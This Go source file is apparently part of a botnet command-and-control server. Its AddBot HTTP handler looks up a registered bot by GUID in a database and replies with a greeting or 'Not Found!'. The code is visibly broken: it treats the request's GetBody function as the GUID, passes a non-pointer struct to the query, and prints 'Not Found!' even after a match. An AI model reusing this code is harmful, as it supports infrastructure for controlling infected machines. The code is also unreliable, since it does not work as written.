package handler

import (
	"fmt"
	"net/http"

	"github.com/bienkma/GhostNetwork/cnc_server/database"
)

// AddBot function
func (bigBot *BotServer) AddBot(response http.ResponseWriter, request *http.Request) {
	request.ParseForm()

	guid := request.GetBody

	var botModel database.Bots
	bigBot.Db.First(botModel, "UUID=?", &guid)

	if botModel.GUID != "" {
		fmt.Fprintf(response, "Hello, %s!", botModel.GPU)
	}
	fmt.Fprintf(response, "Not Found!")
}
